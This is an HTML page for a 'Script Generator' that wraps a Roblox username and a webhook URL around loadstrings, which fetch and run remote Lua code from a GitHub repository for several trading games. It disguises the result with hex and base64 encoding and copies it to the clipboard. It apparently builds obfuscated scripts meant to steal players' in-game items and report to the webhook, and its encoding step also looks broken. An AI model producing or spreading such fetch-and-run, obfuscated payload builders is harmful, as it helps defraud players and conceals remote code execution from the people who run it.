<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Generator</title>
    <style>
        body {
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            margin: 0;
        }
        h1 {
            font-size: 3rem;
        }
        .container {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 20px;
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        input, select, button {
            padding: 10px;
            border-radius: 8px;
            border: none;
            background-color: #333;
            color: white;
            font-size: 1rem;
            width: 250px;
        }
        button {
            background: #ff0080;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <h1>Script Generator</h1>
    <div class="container">
        <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
        <input type="text" id="webhook" placeholder="Enter Webhook URL">
        <button onclick="generateScript()">Generate Script</button>
    </div>

    <script>
        // Loadstrings for different games
        let loadstrings = {
            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
        };

        // Function to encode to Hex
        function hexEncode(script) {
            return script.split('').map(c => c.charCodeAt(0).toString(16)).join('');
        }

        // Function to Base64 encode
        function base64Encode(str) {
            return btoa(unescape(encodeURIComponent(str)));
        }

        // Combine Hex + Base64 for strong obfuscation
        function obfuscateScript(script) {
            let hex = hexEncode(script);
            return base64Encode(hex);
        }

        // Generate and upload script
        function generateScript() {
            let username = document.getElementById('username').value;
            let webhook = document.getElementById('webhook').value;

            if (!username || !webhook) {
                alert("Please enter both Username and Webhook URL!");
                return;
            }

            let selectedScript = loadstrings["Blox Fruits"]; // Fixed to Blox Fruits or change as needed

            let rawScript = `Username = "${username}"\nWebhook = "${webhook}"\n${selectedScript}`;
            let obfuscatedScript = obfuscateScript(rawScript);

            // Final loadstring for Roblox Executor
            let finalScript = `loadstring(game:HttpGet("data:text/plain;base64,${obfuscatedScript}"))()`;

            // Copy to clipboard automatically
            navigator.clipboard.writeText(finalScript).then(() => {
                alert("Obfuscated script copied to clipboard!");
            }).catch(err => {
                console.error('Error copying:', err);
                alert("Failed to copy script.");
            });
        }
    </script>

</body>
</html>
